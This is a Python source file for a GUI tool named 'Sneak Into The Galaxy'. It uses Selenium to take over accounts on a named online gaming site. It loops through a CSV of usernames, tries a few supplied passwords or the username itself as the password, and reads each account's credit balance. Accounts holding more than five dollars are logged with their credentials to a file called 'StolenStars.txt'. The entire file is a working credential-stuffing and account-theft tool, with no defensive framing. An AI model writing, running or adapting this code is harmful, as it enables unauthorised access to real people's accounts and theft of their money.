import tkinter as tk
from tkinter import simpledialog
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import csv
import re
import time

class SneakIntoTheGalaxy(tk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.pack_propagate(0)

        self.title_label = tk.Label(self, text="Sneak Into The Galaxy", font=("Helvetica", 24, "bold"))
        self.title_label.pack(pady=20)

        self.start_button = tk.Button(self, text="Start Sneaking", command=self.start_sneaking)
        self.start_button.pack(pady=10)

    def start_sneaking(self):
        self.start_button.config(state=tk.DISABLED)

        chrome_options = Options()
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-setuid-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')

        # Add the following line to disable hardware acceleration
        chrome_options.add_argument('--disable-gpu')

        driver = webdriver.Chrome(executable_path='./chromedriver', options=chrome_options)
        driver.get("http://web.orionstars.vip/play/orionstars_pc/")

        usernames_file = 'usernames.csv'

        # Read usernames from CSV file
        usernames = []
        with open(usernames_file, 'r') as file:
            reader = csv.reader(file)
            for row in reader:
                usernames.append(row[0])

        max_passwords = 5
        passwords = []

        for i in range(max_passwords):
            password = simpledialog.askstring("Enter Password", f"Enter password {i+1} (leave empty to use username as password):")
            if password is None:
                break
            passwords.append(password)

        for username in usernames:
            username_field = driver.find_element_by_css_selector('#app > div > div:nth-child(2) > div.el-row.top-div > div.el-col.el-col-11.el-col-push-9.ready-login > div:nth-child(1) > input')
            password_field = driver.find_element_by_css_selector('#app > div > div:nth-child(2) > div.el-row.top-div > div.el-col.el-col-11.el-col-push-9.ready-login > div:nth-child(2) > input')

            for password in passwords or [username]:
                username_field.clear()
                password_field.clear()

                username_field.send_keys(username)
                password_field.send_keys(password)
                password_field.send_keys(Keys.RETURN)

                # 1. Wait for the page to load and elements to appear
                time.sleep(2)

                # 2. Check for login success or error
                error_element = driver.find_element_by_id('login-error')
                if error_element.is_displayed():
                    continue

                # 3. Check for credit balance and perform necessary actions
                try:
                    credits_element = driver.find_element_by_css_selector('div#credit-single p')
                    credits_text = credits_element.text
                    credits_match = re.search(r'\d+\.\d+', credits_text)
                    if credits_match:
                        credits = float(credits_match.group())
                        if credits > 5.0:
                            print(f"Username: {username}, Credit balance: ${credits:.2f}")
                            # Perform actions here if needed

                            # 4. Save successful login, remove username from CSV, and update statistics
                            with open('StolenStars.txt', 'a') as f:
                                f.write(f"{username},{password},{credits}\n")

                            usernames.remove(username)  # Remove username from list
                except:
                    pass

                # Clear fields for next attempt
                username_field.clear()
                password_field.clear()

        driver.quit()

if __name__ == "__main__":
    root = tk.Tk()
    sneak_into_galaxy = SneakIntoTheGalaxy(root)
    sneak_into_galaxy.pack(expand=True, fill='both')
    root.mainloop()
